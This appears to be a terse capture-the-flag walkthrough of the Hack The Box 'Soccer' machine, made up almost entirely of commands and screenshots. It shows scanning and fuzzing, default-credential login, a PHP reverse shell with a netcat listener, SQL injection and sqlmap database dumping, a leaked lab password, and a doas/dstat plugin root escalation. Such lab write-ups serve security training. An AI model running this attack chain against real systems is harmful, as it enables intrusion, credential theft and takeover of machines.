```
nmap -p- -T5 -Pn 10.10.11.194
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://soccer.htb/tiny/FUZZ -fw 4 -e .aspx,.php,.txt,.html,.sh
google: tiny file manager default credentials
admin/admin@123
git clone https://github.com/pentestmonkey/php-reverse-shell.git
nc -nlvp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 –batch
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump –batch
ssh player@10.10.11.194
find / -type f -perm -4000 2>/dev/null
cat /usr/local/etc/doas.conf
man dstat
ls -ld /usr/local/share/dstat
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
doas /usr/bin/dstat –list
doas /usr/bin/dstat --pwn
```


```
nmap -p- -T5 -Pn 10.10.11.194
```
![image](https://github.com/regarmulia/HTB/assets/33616880/b8a88354-8431-4faf-bed1-9189bef20fd4)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://soccer.htb/FUZZ -fw 4 -e .aspx,.php,.txt,.html,.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://soccer.htb/tiny/FUZZ -fw 4 -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f1f40f57-6fb8-48e4-9629-59bb877e854c)

![image](https://github.com/regarmulia/HTB/assets/33616880/acda7e8e-9e80-4d80-a1a3-333f9f8e4469)

```
google: tiny file manager default credentials
admin/admin@123
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c6bedb07-7a47-436f-942b-15c949de746b)

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
nc -nlvp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4b12ad89-0d39-4877-b12f-73dab6bb0ea3)

![image](https://github.com/regarmulia/HTB/assets/33616880/ad22edf8-9aa4-49ea-a9df-ecc608b234d0)

![image](https://github.com/regarmulia/HTB/assets/33616880/b8e4db97-b66e-4138-a1b4-38552e356b67)

```
Sign in
OR 1=1
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 –batch
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump –batch
1324 | player@player.htb | PlayerOftheMatch2022 | player
```
![image](https://github.com/user-attachments/assets/d6a2d1d8-1e2f-44b7-9057-c14ab3b0fa68)

![image](https://github.com/regarmulia/HTB/assets/33616880/27f854e3-b36e-4beb-90a7-708e4bbeeffa)

![image](https://github.com/regarmulia/HTB/assets/33616880/176c97ff-d6f4-4bb5-b65e-0206dd0acaf1)

![image](https://github.com/regarmulia/HTB/assets/33616880/fb5cc7e0-df48-4be9-b984-60361ec55bb6)

```
ssh player@10.10.11.194
find / -type f -perm -4000 2>/dev/null
cat /usr/local/etc/doas.conf
man dstat
ls -ld /usr/local/share/dstat
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
doas /usr/bin/dstat –list
doas /usr/bin/dstat --pwn
```
![image](https://github.com/regarmulia/HTB/assets/33616880/90eed874-4f01-4e17-894d-5755485f29a7)

![image](https://github.com/regarmulia/HTB/assets/33616880/268a22c0-f6ec-4990-bedd-586de1a71a28)

![image](https://github.com/regarmulia/HTB/assets/33616880/ae59afef-26d4-43bf-b25a-b44eeeaaecae)
